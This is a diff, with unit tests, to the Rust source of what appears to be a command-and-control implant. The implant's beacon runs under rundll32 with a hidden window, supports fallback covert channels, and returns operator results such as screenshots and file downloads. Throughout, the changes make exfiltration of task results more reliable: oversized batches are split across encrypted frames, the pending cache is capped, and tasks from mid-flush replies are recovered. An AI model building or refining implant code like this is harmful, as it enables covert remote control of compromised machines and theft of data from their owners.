@@ -26,10 +26,23 @@ use nyx_protocol::{
 /// single beacon thread.
 static SLEEP_SECS: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(5);
 
-/// Margin kept under `protocol::frame::MAX_CT_LEN` (256 KiB) when batching
+/// Margin kept under `protocol::frame::MAX_CT_LEN` (512 KiB) when batching
 /// responses into one frame. A streamed Download or Screenshot can exceed the
 /// frame cap; we flush early when the accumulated batch would cross this.
 const BATCH_FLUSH: usize = 200 * 1024;
+
+/// 单帧明文打包预算。`encode_frame_dir` 在 `plaintext + TAG_LEN > MAX_CT_LEN`
+/// 时拒绝封帧——server 不可达期间 pending 缓存会跨 cycle 累积，整批封帧
+/// 一旦超 512 KiB 旧代码就静默跳过（返回 None，批次永远发不出去）。打包时
+/// 只取估算后能放进一帧的前缀，其余留到下一帧；1 KiB 余量覆盖 `encode_vec`
+/// 的逐条 varint/tag/name 开销与 Vec 长度前缀（`response_wire_size` 已按
+/// 24 字节高估逐条开销，这里的余量是双保险）。镜像 agent-dev 的 PACK_BUDGET。
+const PACK_BUDGET: usize = nyx_protocol::frame::MAX_CT_LEN - nyx_protocol::TAG_LEN - 1024;
+
+/// pending 缓存的保留上限（估算字节）。server 长时间不可达时 channel pump
+/// 与任务结果会无限累积；超过上限丢弃最旧的响应并打 diag 标记（保最新），
+/// 绝不允许无界增长。4 MiB 远超一帧的交付能力。镜像 agent-dev 的 PENDING_CAP。
+const PENDING_CAP: usize = 4 * 1024 * 1024;
 
 /// Pump pending window messages so rundll32's hidden window doesn't block.
 /// rundll32 creates a window and expects the entry function to handle messages.
@@ -333,6 +346,14 @@ fn accept_server_counter(counter: u64) -> bool {
 
 /// Encode + send the pending batch, advancing counter on success.
 /// On send failure, tries fallback channels.
+///
+/// Frame split + retention (wave-3, mirrors agent-dev): the cache may hold far
+/// more than one frame after a server outage, so only the leading prefix that
+/// fits under MAX_CT_LEN is sealed — sealing the whole batch used to fail with
+/// PlaintextTooLarge and return None, silently skipping the over-limit batch
+/// FOREVER (worse than a loud abort: the beacon looked alive but its results
+/// never went out). The batch is also capped at PENDING_CAP (oldest dropped,
+/// diag-marked) so an unreachable server can't grow it without bound.
 fn beacon_send_frame(
     pubkey: &[u8; 32],
     counter: &mut u64,
@@ -340,15 +361,26 @@ fn beacon_send_frame(
     pending: &mut Vec<TaskResponse>,
     ch_ctx: &nyx_implant_net::channels::ChannelCtx,
 ) -> Option<Vec<u8>> {
+    // Retention bound: drop the oldest responses past PENDING_CAP and log it —
+    // never grow unbounded while the server is unreachable.
+    if cap_pending(pending, PENDING_CAP) > 0 {
+        nyx_implant_core::diag::diag_mark(b"WARN_PENDING_CAP_DROP");
+    }
+    let prefix = frame_prefix_len(pending, PACK_BUDGET);
     let frame = match encode_frame_dir(
         pubkey,
         Direction::ClientToServer,
         *counter,
         key,
-        &encode_batch(pending),
+        &encode_batch(&mut pending[..prefix]),
     ) {
         Ok(f) => f,
-        Err(_) => return None,
+        Err(_) => {
+            // Estimate drift must not drop the batch: keep it (and the
+            // counter) so the next cycle retries. Never silent.
+            nyx_implant_core::diag::diag_mark(b"ERR_BEACON_SEAL_FRAME");
+            return None;
+        }
     };
     // SAFETY: same contract as the beacon_loop call sites — `ch_ctx` outlives
     // the call and the active channel's fns were resolved at bootstrap.
@@ -361,13 +393,13 @@ fn beacon_send_frame(
     };
     match body {
         Some(b) => {
-            // P0-3: only advance the counter (and drop the batch) once the
-            // round-trip actually succeeded — mirrors the oneshot flush and
+            // P0-3: only advance the counter (and drop the SENT prefix) once
+            // the round-trip actually succeeded — mirrors the oneshot flush and
             // the mid-cycle flush below. On failure we keep `pending` and the
             // SAME counter so the next cycle re-encodes and retries the batch
             // instead of silently dropping it (or desyncing the sequence).
             *counter += 1;
-            pending.clear();
+            pending.drain(..prefix);
             Some(b)
         }
         None => {
@@ -382,8 +414,26 @@ fn beacon_send_frame(
     }
 }
 
+/// Decode the task batch riding a mid-flush reply frame. `None` when the
+/// reply carries no usable frame (parse/AEAD/decode failure or a stale,
+/// replayed counter) — a routine empty or undecodable mid-flush reply must
+/// never abort the beacon loop (same decode discipline as the main cycle).
+/// Mirrors agent-dev's `open_reply_tasks` (BUG-1).
+fn open_reply_tasks(key: &nyx_protocol::crypto::SessionKey, body: &[u8]) -> Option<Vec<Task>> {
+    let raw = parse_frame(body).ok()?;
+    // Same S2C replay protection as beacon_dispatch_tasks: a mid-flush reply
+    // is a real server frame with a strictly-increasing counter.
+    if !accept_server_counter(raw.counter) {
+        return None;
+    }
+    let plaintext = open_frame_dir(key, Direction::ServerToClient, &raw).ok()?;
+    Task::decode_vec(&plaintext).ok()
+}
+
 /// Decode server reply into tasks, dispatch each command, and flush mid-cycle
-/// when the batch exceeds BATCH_FLUSH.
+/// when the batch exceeds BATCH_FLUSH. Tasks unpacked from mid-flush replies
+/// run after the current batch, ahead of the next cycle's fetch (FIFO vs the
+/// server queue — mirrors agent-dev's `deferred_tasks`, BUG-1).
 unsafe fn beacon_dispatch_tasks(
     body: &[u8],
     key: &nyx_protocol::crypto::SessionKey,
@@ -411,19 +461,38 @@ unsafe fn beacon_dispatch_tasks(
         return true;
     };
 
-    for t in tasks {
-        if matches!(t.command, Command::Exit) {
-            return false;
+    // Tasks unpacked from mid-flush reply frames (BUG-1). They were dequeued
+    // server-side, so dropping them is not an option; they run in rounds
+    // behind the batch that was being dispatched when they arrived.
+    let mut deferred: Vec<Task> = Vec::new();
+    let mut round = tasks;
+    loop {
+        for t in round {
+            if matches!(t.command, Command::Exit) {
+                return false;
+            }
+            for response in
+                crate::task_guard::run(|| execute(rt, t.command, counter, pubkey, key, cfg))
+            {
+                pending.push(TaskResponse {
+                    task_id: t.task_id,
+                    response,
+                });
+                // 保留上限：flush 反复失败（server 不可达）时大型流式结果会
+                // 无界堆积——丢最旧、打 diag 标记，绝不允许撑爆内存（镜像
+                // agent-dev 的 PENDING_CAP 纪律）。
+                if cap_pending(pending, PENDING_CAP) > 0 {
+                    nyx_implant_core::diag::diag_mark(b"WARN_PENDING_CAP_DROP");
+                }
+                // Flush mid-cycle if batch nears frame cap; any tasks riding
+                // the flush reply are deferred behind the current batch.
+                beacon_dispatch_flush(pubkey, counter, key, pending, ch_ctx, &mut deferred);
+            }
         }
-        for response in crate::task_guard::run(|| execute(rt, t.command, counter, pubkey, key, cfg))
-        {
-            pending.push(TaskResponse {
-                task_id: t.task_id,
-                response,
-            });
-            // Flush mid-cycle if batch nears frame cap.
-            beacon_dispatch_flush(pubkey, counter, key, pending, ch_ctx);
+        if deferred.is_empty() {
+            break;
         }
+        round = core::mem::take(&mut deferred);
     }
     true
 }
@@ -432,23 +501,41 @@ unsafe fn beacon_dispatch_tasks(
 /// send failure the batch is kept (and the counter unchanged) so the next
 /// cycle re-encodes and retries it — mirrors the oneshot and end-of-cycle
 /// flushes.
+///
+/// NOT fire-and-forget (BUG-1): the server packs newly-queued tasks into
+/// EVERY beacon reply, mid-flush ones included
+/// (`handle_existing_session_pack_tasks` dequeues `s.pending` into each
+/// response). The reply body is therefore consumed and any tasks it carries
+/// are appended to `deferred` so the caller dispatches them behind the
+/// current batch — the old code dropped the body and those tasks evaporated
+/// server-side without ever executing.
 fn beacon_dispatch_flush(
     pubkey: &[u8; 32],
     counter: &mut u64,
     key: &nyx_protocol::crypto::SessionKey,
     pending: &mut Vec<TaskResponse>,
     ch_ctx: &nyx_implant_net::channels::ChannelCtx,
+    deferred: &mut Vec<Task>,
 ) {
     if pending_batch_size(pending) > BATCH_FLUSH {
+        // Frame split (wave-3): a failed flush leaves the batch in `pending`,
+        // so after a server outage it can hold far more than one frame. Seal
+        // only the leading prefix that fits under MAX_CT_LEN — the old
+        // whole-batch seal failed with PlaintextTooLarge and silently kept an
+        // undeliverable batch forever.
+        let prefix = frame_prefix_len(pending, PACK_BUDGET);
         let frame = match encode_frame_dir(
             pubkey,
             Direction::ClientToServer,
             *counter,
             key,
-            &encode_batch(pending),
+            &encode_batch(&mut pending[..prefix]),
         ) {
             Ok(f) => f,
-            Err(_) => return,
+            Err(_) => {
+                nyx_implant_core::diag::diag_mark(b"ERR_BEACON_SEAL_FLUSH");
+                return;
+            }
         };
         // SAFETY: same contract as the beacon_loop call sites — `ch_ctx`
         // outlives the call and the active channel's fns were resolved at
@@ -460,9 +547,14 @@ fn beacon_dispatch_flush(
                 &frame,
             )
         };
-        if sent.is_some() {
+        if let Some(body) = sent {
             *counter += 1;
-            pending.clear();
+            pending.drain(..prefix);
+            // Consume the reply: tasks queued while a large streamed result
+            // (screenshot/download) was mid-flush ride this frame.
+            if let Some(mut tasks) = open_reply_tasks(key, &body) {
+                deferred.append(&mut tasks);
+            }
         }
     }
 }
@@ -814,7 +906,15 @@ fn beacon_oneshot_poll_frame(
     }
 }
 
-/// Execute one batch of tasks and POST the responses back (single cycle).
+/// Execute task batch(es) and POST the responses back, then return.
+///
+/// NOT fire-and-forget at the flush (BUG-1 pattern, see `open_reply_tasks`):
+/// the server packs newly-queued tasks into EVERY reply, the response-flush
+/// reply included, and those tasks were dequeued server-side — dropping the
+/// reply body would evaporate them. Tasks riding a flush reply therefore run
+/// in rounds behind the batch that was being flushed, exactly like the beacon
+/// loop's deferred mid-flush tasks; the oneshot returns once a flush reply
+/// carries no further tasks (or the flush itself failed).
 fn beacon_oneshot_run_tasks(
     pubkey: &[u8; 32],
     counter: &mut u64,
@@ -824,33 +924,68 @@ fn beacon_oneshot_run_tasks(
     ch_ctx: &nyx_implant_net::channels::ChannelCtx,
     tasks: Vec<Task>,
 ) {
-    // Execute + POST results back (one cycle, then we're done).
-    let mut pending: Vec<TaskResponse> = Vec::new();
-    for t in tasks {
-        if matches!(t.command, Command::Exit) {
-            break;
+    let mut round = tasks;
+    loop {
+        // Execute + POST results back (one round per iteration).
+        let mut pending: Vec<TaskResponse> = Vec::new();
+        let mut exit = false;
+        for t in round {
+            if matches!(t.command, Command::Exit) {
+                exit = true;
+                break;
+            }
+            for response in
+                crate::task_guard::run(|| execute(rt, t.command, counter, pubkey, key, cfg))
+            {
+                pending.push(TaskResponse {
+                    task_id: t.task_id,
+                    response,
+                });
+            }
         }
-        for response in crate::task_guard::run(|| execute(rt, t.command, counter, pubkey, key, cfg))
-        {
-            pending.push(TaskResponse {
-                task_id: t.task_id,
-                response,
-            });
+        if pending.is_empty() {
+            return;
+        }
+        let body = beacon_oneshot_flush(pubkey, counter, key, ch_ctx, &mut pending);
+        if exit {
+            return;
+        }
+        // Consume the flush reply: tasks queued while this round ran ride the
+        // reply frame and were dequeued server-side — never drop them.
+        match oneshot_flush_reply_tasks(key, body.as_deref()) {
+            Some(next) => round = next,
+            None => return,
         }
     }
-    if !pending.is_empty() {
-        beacon_oneshot_flush(pubkey, counter, key, ch_ctx, &mut pending);
+}
+
+/// Decide the next oneshot round from a flush reply body. Mirrors the beacon
+/// loop's mid-flush deferred-task handling (BUG-1): `None` when the flush
+/// failed, the reply carried no usable frame, or the batch was empty — the
+/// oneshot then exits normally.
+fn oneshot_flush_reply_tasks(
+    key: &nyx_protocol::crypto::SessionKey,
+    body: Option<&[u8]>,
+) -> Option<Vec<Task>> {
+    let tasks = open_reply_tasks(key, body?)?;
+    if tasks.is_empty() {
+        None
+    } else {
+        Some(tasks)
     }
 }
 
 /// Seal + send the response batch; advance the counter only on success (P0-3).
+/// Returns the reply body on success — the server packs newly-queued tasks
+/// into EVERY reply, this flush included, so the caller must consume it
+/// (BUG-1 pattern) instead of letting those tasks evaporate.
 fn beacon_oneshot_flush(
     pubkey: &[u8; 32],
     counter: &mut u64,
     key: &nyx_protocol::crypto::SessionKey,
     ch_ctx: &nyx_implant_net::channels::ChannelCtx,
     pending: &mut Vec<TaskResponse>,
-) {
+) -> Option<Vec<u8>> {
     // P0-4: encode_batch swaps any oversized Response for an Err so the
     // frame always encodes instead of aborting the beacon.
     let rframe = match encode_frame_dir(
@@ -866,7 +1001,7 @@ fn beacon_oneshot_flush(
             // Keep `pending` (do not advance counter) so the responses
             // are retried — but oneshot exits after this cycle, so just
             // break out of the response loop.
-            return;
+            return None;
         }
     };
     let sent = unsafe {
@@ -881,6 +1016,7 @@ fn beacon_oneshot_flush(
     if sent.is_some() {
         *counter += 1;
     }
+    sent
 }
 /// Encode a batch of [`TaskResponse`]s for the wire, gracefully handling an
 /// oversized payload. `TaskResponse::encode_vec` only fails when a blob
@@ -890,7 +1026,7 @@ fn beacon_oneshot_flush(
 /// `Response::Err` and retry. The operator sees what was dropped instead of
 /// the implant dying. `Response::Err` messages are themselves bounded well
 /// under `MAX_BLOB_LEN`, so the retry always succeeds.
-fn encode_batch(pending: &mut Vec<TaskResponse>) -> Vec<u8> {
+fn encode_batch(pending: &mut [TaskResponse]) -> Vec<u8> {
     if let Ok(v) = TaskResponse::encode_vec(pending) {
         return v;
     }
@@ -926,6 +1062,57 @@ fn pending_batch_size(pending: &[TaskResponse]) -> usize {
             _ => 0,
         })
         .sum()
+}
+
+/// 估算单条 [`TaskResponse`] 编码后的体积：blob/文本主体 + 逐条 varint、
+/// tag、name、seq/eof 开销（`OVERHEAD` 故意高估）。只用于打包/保留决策，
+/// 不要求精确。镜像 agent-dev 的 `response_wire_size`。
+fn response_wire_size(tr: &TaskResponse) -> usize {
+    const OVERHEAD: usize = 24;
+    match &tr.response {
+        Response::FileChunk { name, data, .. } => data.len() + name.len() + OVERHEAD,
+        Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len() + OVERHEAD,
+        Response::Channel { data, .. } => data.len() + OVERHEAD,
+        Response::Ok => OVERHEAD,
+        Response::Err(m) => m.len() + OVERHEAD,
+    }
+}
+
+/// pending 前缀中估算能在 `budget` 内编码的条数，空批次返回 0，非空至少
+/// 返回 1（单条超限 blob 会被 `encode_batch` 换成有界 `Response::Err`，
+/// 独占一帧总能放下）。调用方按 `pending[..n]` 封帧、仅发送成功后
+/// `drain(..n)`，从而 server 不可达期间累积的超大缓存按帧切分发送，
+/// 绝不触发 `MAX_CT_LEN` 静默卡死。镜像 agent-dev 的 `frame_prefix_len`。
+fn frame_prefix_len(pending: &[TaskResponse], budget: usize) -> usize {
+    if pending.is_empty() {
+        return 0;
+    }
+    let mut used = 8; // encode_vec 的 Vec 长度前缀
+    let mut n = 0;
+    for tr in pending {
+        let size = response_wire_size(tr);
+        if n > 0 && used + size > budget {
+            break;
+        }
+        used += size;
+        n += 1;
+    }
+    n.max(1)
+}
+
+/// pending 总量超 `cap`（估算字节）时丢弃最旧的响应（保最新），返回丢弃
+/// 条数，调用方负责记日志/diag 标记。镜像 agent-dev 的 `cap_pending`。
+fn cap_pending(pending: &mut Vec<TaskResponse>, cap: usize) -> usize {
+    let mut total: usize = pending.iter().map(response_wire_size).sum();
+    let mut dropped = 0;
+    while total > cap && dropped < pending.len() {
+        total -= response_wire_size(&pending[dropped]);
+        dropped += 1;
+    }
+    if dropped > 0 {
+        pending.drain(..dropped);
+    }
+    dropped
 }
 
 /// Execute a command, returning zero or more responses. `counter`/`pubkey`/`key`
@@ -1283,4 +1470,302 @@ fn sleep_jitter(base: u32, jitter_pct: u8) {
     let off = if span > 0 { x % (2 * span) } else { 0 };
     let actual = base.saturating_add(off).saturating_sub(span);
     crate::kits::sleep(actual.max(1));
+}
+
+// ── Tests ────────────────────────────────────────────────────────────────────
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use core::sync::atomic::Ordering;
+
+    /// Seal a task batch the way the team server does (S2C nonce space).
+    fn seal_server_batch(
+        key: &nyx_protocol::crypto::SessionKey,
+        counter: u64,
+        tasks: &[Task],
+    ) -> Vec<u8> {
+        let plain = Task::encode_vec(tasks).expect("encode task batch");
+        encode_frame_dir(&[0x24; 32], Direction::ServerToClient, counter, key, &plain)
+            .expect("seal server reply")
+    }
+
+    fn test_cfg() -> Config {
+        Config {
+            server_host: String::from("127.0.0.1"),
+            server_port: 1, // dead port — a flush attempt must fail, never hang
+            beacon_uri: String::from("/beacon"),
+            server_pub: [0u8; 32],
+            sleep_seconds: 5,
+            jitter_pct: 0,
+            use_tls: false,
+            primary_channel: 0,
+            fallback_bitmap: 0,
+            doh_resolver: String::new(),
+            smb_pipe_name: String::new(),
+            extc2_api_host: String::new(),
+            extc2_token: String::new(),
+            rotation_hosts: String::new(),
+            fronting_host: String::new(),
+            proxy_server: String::new(),
+            tcp_peer_host: String::new(),
+            tcp_peer_port: 0,
+        }
+    }
+
+    fn test_ctx() -> nyx_implant_net::channels::ChannelCtx {
+        nyx_implant_net::channels::ChannelCtx::from_config(&test_cfg())
+    }
+
+    #[test]
+    fn mid_flush_reply_garbage_decodes_to_none() {
+        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
+        // Never touches the accept-counter static: parse fails first.
+        assert!(open_reply_tasks(&key, b"").is_none());
+        assert!(open_reply_tasks(&key, b"not a frame").is_none());
+    }
+
+    /// Single fn for every LAST_SERVER_COUNTER assertion: the static is
+    /// shared, so parallel tests must not interleave on it (same discipline
+    /// as the ROTATION_IDX tests in nyx-implant-net channels/mod.rs).
+    #[test]
+    fn mid_flush_reply_tasks_are_recovered_replays_rejected() {
+        LAST_SERVER_COUNTER.store(0, Ordering::Relaxed);
+        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
+        let tasks = vec![
+            Task {
+                task_id: 7,
+                command: Command::Ping,
+            },
+            Task {
+                task_id: 8,
+                command: Command::Sleep {
+                    seconds: 30,
+                    jitter_pct: 10,
+                },
+            },
+        ];
+
+        // BUG-1 regression: tasks riding a mid-flush reply must decode —
+        // the old fire-and-forget flush dropped this body and the tasks
+        // (already dequeued server-side) evaporated without executing.
+        let body = seal_server_batch(&key, 1, &tasks);
+        let got = open_reply_tasks(&key, &body).expect("mid-flush tasks must decode");
+        assert_eq!(got, tasks, "mid-flush tasks must be recovered, not lost");
+
+        // Replay: the SAME frame again is rejected (S2C replay protection
+        // applies to mid-flush replies exactly as to cycle replies).
+        assert!(open_reply_tasks(&key, &body).is_none());
+
+        // A routine EMPTY mid-flush reply decodes to zero tasks (no error).
+        let empty = seal_server_batch(&key, 2, &[]);
+        let got = open_reply_tasks(&key, &empty).expect("empty batch decodes");
+        assert!(got.is_empty(), "empty mid-flush reply carries no tasks");
+
+        // Wrong key → AEAD open fails → None (never aborts the beacon).
+        let other = nyx_protocol::crypto::SessionKey::new([0x99; 32]);
+        let foreign = seal_server_batch(&other, 3, &tasks);
+        assert!(open_reply_tasks(&key, &foreign).is_none());
+
+        // Oneshot flush-reply rounds (wave-3): the oneshot flush consumes its
+        // reply body exactly like the mid-flush path — tasks riding it decide
+        // the next round, an empty batch (or a failed/absent flush) ends the
+        // oneshot. (The foreign frame above already advanced the static to 3,
+        // so these seal at 4/5.)
+        let body4 = seal_server_batch(&key, 4, &tasks);
+        let got = oneshot_flush_reply_tasks(&key, Some(&body4))
+            .expect("oneshot flush-reply tasks must decode");
+        assert_eq!(got, tasks, "flush-reply tasks must drive the next round");
+        assert!(
+            oneshot_flush_reply_tasks(&key, None).is_none(),
+            "a failed flush (no body) ends the oneshot"
+        );
+        let empty5 = seal_server_batch(&key, 5, &[]);
+        assert!(
+            oneshot_flush_reply_tasks(&key, Some(&empty5)).is_none(),
+            "an empty flush reply ends the oneshot"
+        );
+
+        // The dispatch loop itself: a Ping task batch produces a pending
+        // response and keeps the loop alive; responses are tiny so no
+        // mid-flush fires (dead port anyway — a flush would just retain).
+        let cfg = test_cfg();
+        let ch_ctx = test_ctx();
+        let mut counter = 10u64;
+        let mut pending: Vec<TaskResponse> = Vec::new();
+        let ping_body = seal_server_batch(
+            &key,
+            10,
+            &[Task {
+                task_id: 42,
+                command: Command::Ping,
+            }],
+        );
+        let keep_running = unsafe {
+            beacon_dispatch_tasks(
+                &ping_body,
+                &key,
+                &[0x24; 32],
+                &mut counter,
+                &cfg,
+                None,
+                &ch_ctx,
+                &mut pending,
+            )
+        };
+        assert!(keep_running, "Ping batch must not stop the loop");
+        assert_eq!(pending.len(), 1);
+        assert_eq!(pending[0].task_id, 42);
+        assert!(matches!(pending[0].response, Response::Ok));
+
+        // An Exit task — even one arriving in a later frame — stops the loop.
+        let exit_body = seal_server_batch(
+            &key,
+            11,
+            &[Task {
+                task_id: 43,
+                command: Command::Exit,
+            }],
+        );
+        let keep_running = unsafe {
+            beacon_dispatch_tasks(
+                &exit_body,
+                &key,
+                &[0x24; 32],
+                &mut counter,
+                &cfg,
+                None,
+                &ch_ctx,
+                &mut pending,
+            )
+        };
+        assert!(!keep_running, "Exit task must stop the loop");
+
+        LAST_SERVER_COUNTER.store(0, Ordering::Relaxed);
+    }
+
+    #[test]
+    fn frame_prefix_len_splits_over_limit_batch_and_every_prefix_seals() {
+        // Wave-3 regression: server 不可达时 pending 缓存跨 cycle 累积，整批
+        // encode_frame_dir 超 MAX_CT_LEN（512 KiB）旧代码静默 return None —
+        // 批次永远发不出去（信标看似存活但结果全丢）。打包必须按帧切分，且
+        // 每个前缀都必须能真实封帧（用真 AEAD 验证，而不只是估算）。
+        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
+        let pubkey = [0x24; 32];
+
+        // ~2.5 MiB 的批次（80 × 32 KiB blob），远超一帧，但在 PENDING_CAP 内。
+        let mk = |i: u64| TaskResponse {
+            task_id: i,
+            response: Response::Output(vec![b'x'; 32 * 1024]),
+        };
+        let mut pending: Vec<TaskResponse> = (0..80).map(mk).collect();
+        // 先证明旧路径确实会失败：整批封帧超 MAX_CT_LEN。
+        assert!(
+            encode_frame_dir(
+                &pubkey,
+                Direction::ClientToServer,
+                0,
+                &key,
+                &encode_batch(&mut pending.clone()),
+            )
+            .is_err(),
+            "whole-batch seal must exceed MAX_CT_LEN (this was the silent-stall path)"
+        );
+
+        let total = pending.len();
+        let mut counter = 0u64;
+        let mut sent = 0;
+        while !pending.is_empty() {
+            let n = frame_prefix_len(&pending, PACK_BUDGET);
+            assert!((1..=pending.len()).contains(&n));
+            let plain = encode_batch(&mut pending[..n]);
+            let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, counter, &key, &plain);
+            assert!(
+                frame.is_ok(),
+                "prefix frame must seal (prefix {n} items, {} plaintext bytes)",
+                plain.len()
+            );
+            counter += 1;
+            pending.drain(..n); // 仅“发送成功”后移除已发前缀（此处模拟成功）
+            sent += n;
+        }
+        assert_eq!(
+            sent, total,
+            "every response must be deliverable across frames"
+        );
+        assert!(
+            counter >= 2,
+            "an over-limit batch must take multiple frames"
+        );
+    }
+
+    #[test]
+    fn frame_prefix_len_guarantees_progress() {
+        // 空批次 → 0；非空批次即使预算再小也至少 1 条（否则 flush 死锁）。
+        assert_eq!(frame_prefix_len(&[], PACK_BUDGET), 0);
+        let pending = vec![TaskResponse {
+            task_id: 1,
+            response: Response::Output(vec![0u8; nyx_protocol::wire::MAX_BLOB_LEN]),
+        }];
+        assert_eq!(frame_prefix_len(&pending, 1), 1);
+        // 顶着 MAX_BLOB_LEN 的单条仍在 PACK_BUDGET 内（256 KiB < 511 KiB）。
+        assert_eq!(frame_prefix_len(&pending, PACK_BUDGET), 1);
+    }
+
+    #[test]
+    fn cap_pending_drops_oldest_and_keeps_newest() {
+        // server 长期不可达：缓存超保留上限时丢最旧、保最新，不无界增长。
+        let mk = |id: u64| TaskResponse {
+            task_id: id,
+            response: Response::Output(vec![b'y'; 1000]),
+        };
+        let mut pending: Vec<TaskResponse> = (0..10).map(mk).collect();
+        // 每条估算 1024 字节；cap 3072 → 恰好保留最新 3 条。
+        let dropped = cap_pending(&mut pending, 3072);
+        assert_eq!(dropped, 7);
+        assert_eq!(pending.len(), 3);
+        assert_eq!(
+            pending[0].task_id, 7,
+            "survivors must be the newest responses"
+        );
+        // 已在 cap 内不再丢。
+        assert_eq!(cap_pending(&mut pending, 3072), 0);
+        assert_eq!(pending.len(), 3);
+        // 空批次是 no-op；cap 0 清空全部但不 panic。
+        assert_eq!(cap_pending(&mut Vec::new(), 0), 0);
+        let mut one = vec![mk(42)];
+        assert_eq!(cap_pending(&mut one, 0), 1);
+        assert!(one.is_empty());
+    }
+
+    #[test]
+    fn pending_cache_over_frame_limit_never_fails_seal_after_cap_and_split() {
+        // 端到端打包语义（无网络）：模拟 server 不可达期间 pending 累积到
+        // 超过一帧——先 cap 再按帧切分，封帧必须始终成功（旧代码在此
+        // 静默跳过整批，永久卡死）。
+        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
+        let pubkey = [0x24; 32];
+        // 900 条小响应 ≈ 921 KB（估算），超一帧但在 PENDING_CAP 内。
+        let mut pending: Vec<TaskResponse> = (0..900)
+            .map(|i| TaskResponse {
+                task_id: i,
+                response: Response::Output(vec![b'z'; 1000]),
+            })
+            .collect();
+        // beacon_send_frame 的打包序列：cap → 前缀 → 封帧。
+        assert_eq!(cap_pending(&mut pending, PENDING_CAP), 0);
+        let mut frames = 0u64;
+        while !pending.is_empty() {
+            let n = frame_prefix_len(&pending, PACK_BUDGET);
+            assert!(n >= 1, "non-empty batch must always make progress");
+            let plain = encode_batch(&mut pending[..n]);
+            assert!(
+                encode_frame_dir(&pubkey, Direction::ClientToServer, frames, &key, &plain).is_ok(),
+                "frame {frames} must seal after cap+split"
+            );
+            pending.drain(..n);
+            frames += 1;
+        }
+        assert!(frames >= 2, "~921 KB must span multiple frames");
+    }
 }
